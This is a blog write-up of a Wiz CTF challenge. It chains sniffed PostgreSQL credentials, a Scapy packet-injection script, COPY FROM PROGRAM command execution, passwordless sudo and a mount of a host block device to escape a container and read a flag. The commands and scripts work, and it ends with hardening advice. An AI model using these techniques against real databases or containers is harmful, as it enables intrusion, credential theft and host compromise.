---
layout: post
title: "Wiz CTF July 2025: PostgreSQL Container Escape"
date: 2025-08-10
categories: [ctf, security]
tags: [ctf, security, container-escape, postgresql, docker, pentesting]
excerpt: "Exploiting network traffic capture, PostgreSQL command execution, and container misconfigurations to achieve a complete container escape and access the host filesystem."
---

## Challenge Overview

In this Wiz CTF challenge, I achieved a complete container escape by chaining together network traffic analysis, database exploitation, and container misconfigurations. The attack path involved capturing PostgreSQL credentials from unencrypted network traffic, leveraging database privileges for command execution, and ultimately mounting the host filesystem to retrieve the flag.

## Vulnerabilities Exploited

**Container Escape via Database Exploitation** combining:
- Unencrypted PostgreSQL network traffic
- PostgreSQL `COPY TO/FROM PROGRAM` command execution
- Excessive sudo privileges on database user
- Container access to host block devices

## Attack Steps

### 1. Initial Reconnaissance

I started by exploring the container environment to identify potential attack vectors:

```bash
ps aux
netstat -tunap
```

This revealed an active PostgreSQL connection on port 5432 between containers, which became my primary target.

### 2. Network Traffic Capture and Analysis

I captured the database traffic to extract credentials:

```bash
# Start packet capture in background
tcpdump -i eth0 -s 0 -w /tmp/pgdump.pcap port 5432 &
```

Next, I used Scapy to analyze the traffic and attempt a direct exploitation:

```python
from scapy.all import *
import struct

# Capture PostgreSQL server response
pkts = sniff(count=1, filter="tcp and src host 172.19.0.2 and src port 5432", timeout=10)

if pkts:
    server_pkt = pkts[0]
    my_seq = server_pkt[TCP].ack
    payload_len = len(server_pkt[Raw].load) if server_pkt.haslayer(Raw) else 0
    my_ack = server_pkt[TCP].seq + payload_len
    my_sport = server_pkt[TCP].dport

    # Craft PostgreSQL COPY TO PROGRAM packet
    exploit_cmd = 'sudo cat /flag'
    pg_query = f"COPY (SELECT '') TO PROGRAM '{exploit_cmd}'"
    query_payload = pg_query.encode('utf-8')
    query_length = len(query_payload) + 4 + 1
    pg_packet_data = b'Q' + struct.pack('>I', query_length) + query_payload + b'\x00'

    ip = IP(src="172.19.0.3", dst="172.19.0.2")
    tcp = TCP(sport=my_sport, dport=5432, flags="PA", seq=my_seq, ack=my_ack)
    exploit_packet = ip/tcp/pg_packet_data

    send(exploit_packet, verbose=0)
    print("[+] Direct flag read attempt sent!")
```

While the initial packet injection didn't work directly, I extracted the database credentials from the capture:

```bash
strings /tmp/pgdump.pcap
# Found: user, mydatabase, SecretPostgreSQLPassword
```

### 3. Direct PostgreSQL Connection

With the extracted credentials, I connected to the database:

```bash
psql -h 172.19.0.2 -U user -d mydatabase
# Password: SecretPostgreSQLPassword
```

### 4. PostgreSQL Command Execution and Privilege Discovery

I created a temporary table to capture command output:

```sql
CREATE TEMP TABLE out(line text);

-- Check current privileges
COPY out FROM PROGRAM 'id 2>&1';
SELECT * FROM out; TRUNCATE out;
-- Result: uid=999(postgres) gid=999(postgres)

-- Check sudo capabilities
COPY out FROM PROGRAM 'sudo -l 2>&1';
SELECT * FROM out; TRUNCATE out;
-- Result: (ALL) NOPASSWD: ALL
```

This revealed the postgres user had unrestricted sudo access - a critical misconfiguration.

### 5. Container Escape - Device Discovery

I enumerated available storage devices to identify escape paths:

```sql
-- List block devices
COPY out FROM PROGRAM 'sudo fdisk -l 2>&1';
SELECT * FROM out; TRUNCATE out;
-- Found: /dev/vda (squashfs), /dev/vdb

-- Check current mounts
COPY out FROM PROGRAM 'sudo cat /proc/mounts 2>&1';
SELECT * FROM out; TRUNCATE out;

-- Create mount point
COPY out FROM PROGRAM 'sudo mkdir -p /mnt/host 2>&1';
SELECT * FROM out; TRUNCATE out;
```

### 6. Container Escape - Host Filesystem Access

With access to host block devices, I mounted the host filesystem:

```sql
-- Mount the host root filesystem
COPY out FROM PROGRAM 'sudo mount /dev/vda /mnt/host 2>&1';
SELECT * FROM out; TRUNCATE out;

-- Verify mount
COPY out FROM PROGRAM 'sudo ls -la /mnt/host/ 2>&1';
SELECT * FROM out; TRUNCATE out;

-- Read the flag from host
COPY out FROM PROGRAM 'sudo cat /mnt/host/flag 2>&1';
SELECT * FROM out; TRUNCATE out;
```

**Flag:** `CTF{how_turned_guests_to_hosts}`

## Key Takeaways

This challenge demonstrated a sophisticated container escape chain:

1. **Network Traffic Analysis**: Captured and extracted PostgreSQL credentials from unencrypted network traffic
2. **Database Command Execution**: Leveraged PostgreSQL's `COPY TO/FROM PROGRAM` to execute arbitrary commands
3. **Privilege Escalation**: Exploited misconfigured sudo permissions on the postgres user
4. **Container Escape**: Mounted host block devices to access the underlying filesystem

The attack succeeded because:
- Database traffic was unencrypted and contained credentials
- The postgres user had unrestricted sudo access
- The container had access to host block devices (`/dev/vda`)
- The container ran with sufficient privileges to mount filesystems

### Alternative Methods I Attempted

- **Core Pattern Escape**: Tried `/proc/sys/kernel/core_pattern` for code execution
- **Namespace Escape**: Attempted `nsenter` to join host namespaces
- **Process Tree Analysis**: Explored `/proc/1/root` for host filesystem access

This highlights critical security principles:
- **Network Encryption**: Always encrypt database connections, even between containers
- **Least Privilege**: Service accounts should never have unrestricted sudo access
- **Container Hardening**: Isolate containers from host devices using proper security contexts
- **Device Restrictions**: Use `--device` flags carefully and avoid exposing host block devices
- **Security Monitoring**: Log privileged operations and unusual network patterns